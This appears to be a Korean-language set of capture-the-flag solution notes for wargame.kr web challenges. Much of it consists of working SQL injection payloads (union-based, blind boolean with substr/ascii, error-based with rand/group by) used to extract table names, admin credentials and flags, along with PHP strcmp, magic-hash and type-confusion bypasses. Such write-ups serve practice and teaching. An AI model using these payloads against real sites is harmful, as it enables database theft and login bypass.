# wargame.kr

>md5 password

md5 raw hash 이용

ex) 129581926211651571912466741651878684928


>DB is really GOOD

"/" 입력후 취약점 발견

db 다운로드후 확인


>strcmp

strcmp 취약점 이용

배열이용 ex)strcmp($pass,$ps) -> $ps=$ps[]


>md5_compare

magic hash 취약점 이용

magic number = 240610708

magic string = QNKCDZO


>tmitter

db구조 주어짐 

회원가입 maxlength 조절 ex) "admin               asd"


>type_confusion

json 형식으로 값받음

느슨한 비교연산 

"PHP" == true  //true 이용

버프스위트로 값변환

{key : true}


>img_recovery

파일은 apng파일 

apng assembler이용하여 2개의 이미지 획득후 겹쳐주면됨


>php_c

32비트 int범위 -2,147,483,648 ~ 2,147,438,647

c 파일에서 중간에 5를 더해줌 

그래서 2,147,438,643에서 5 더해주면 -2,147,483,648가 됨


>web_chatting

공격위치 ni 

ni=36671 union select 1,table_name,3,4,5 from information_schema.tables-- 

table_name : chat_log_secret이 의심됨

ni=36671 union select 1,column_name,3,4,5 from information_schema.columns-- 

column_name : readme가 의심됨

ni=36671 union select 1,readme,3,4,5 from chat_log_secret-- 


>pyc decompile 

pyc파일을 디컴파일후 코드를 수정해서 flag를 얻고 입력

코드 수정시 현재 시간과 차이만큼 더해줘야함


>simpleBoard

union이용 쿠키에

공격위치 idx

union 가능 확인

idx=5 union select 1,2,3,4#

table명 확인

idx=5 union select table_name,2,3,4 from information_schema.tables#

table_name : README

컬럼명확인

idx=5 union select column_name,2,3,4 from information_schema.columns#

column_name : flag

idx=5 union select flag,2,3,4 from README#


>ip_log_table

blind sql injection

공격위치 idx 

false일때 1970-01-01 09:00:00 출력

true일때 서버시간 출력인듯?


' 필터링 

blind sql injection substr,ascii이용

table 찾기 

find table_name : ip_table, admin_table

idx="37869 and if(ascii(substr((select table_name from information_schema.tables order by table_type limit "+str(limit)
+",1)," + str(i) + ",1))=" + str(j) + ",1,0)"

find column_name : idx, id, ps

idx="37869 and if(ascii(substr((select column_name from information_schema.columns where table_name=0x"
+"admin_table".encode('hex')+" limit "+str(limit)+",1)," + str(i) + ",1))=" + str(j) + ",1,0)"

find id, ps : blue_admin, 0h~myp4ss!

idx="37869 and if(ascii(substr((select id from admin_table limit "+str(limit)+",1)," + str(i) + ",1))=" + str(j) + ",1,0)"

idx="37869 and if(ascii(substr((select ps from admin_table limit "+str(limit)+",1)," + str(i) + ",1))=" + str(j) + ",1,0)"


>lonely_guys

공격위치 sort 

mysql_real_escape_string($sort) sql injection 방어

authkey이용

table_name : guys_tbl

flag_length=40

idx=",(select 1 from guys_tbl,authkey where 1=1 and (length(authkey)="+str(length)+"))"

flag

idx=",(select 1 from guys_tbl,authkey where 1=1 and (ord(substr(authkey,"+str(i)+",1))="+str(j)+"))"


>dmbs335

공격위치 query_parts

태스트

query_parts=1 union select 1,2,3,4--

table_name : Th1s_1s_Flag_tbl

query_parts=1 union select table_name,2,3,4 from information_schema.tables--

column_name : f1ag

query_parts=1 union select column_name,2,3,4 from information_schema.columns where table_name='Th1s_1s_Flag_tbl'--

flag : 

query_parts=1 union select f1ag,2,3,4 from Th1s_1s_Flag_tbl-- 


>counting_query

공격위치: type

id=222.110.147.52&pw=asd&type=2 || row(1,1)=(select count(*), concat(ps,0x3a,floor(rand(0)*2)) as x from (select 1 union select 2 union select 3)y group by x limit 1)


>adm1nkyj

table_name : findflag_2

pw의 컬럼: and xPw4coaa1sslfe

id=' union select 1,&pw=,3,4,5%2

id: adm1ngnngn

id=' or 1=1 limit 0,1%23&pw=,3,4,5%23

pw: !@SA#$!

id=123' union select 1,xPw4coaa1sslfe,3,4,5 from findflag_2 where 1=1 limit 0,1%23&pw=

flag: surVvKIp0l1Cy48WLfi2q6tdwFTOJ3EboBxeQgMX7SGYkDAjcamNZ5PRnhUz9H

123' union select 1,d,3,4,5 from (select 1 as a,2 as b,3 as c,4 as d,5 as e union select * from findflag_2) as hh where 
1=1 limit 1,1%23

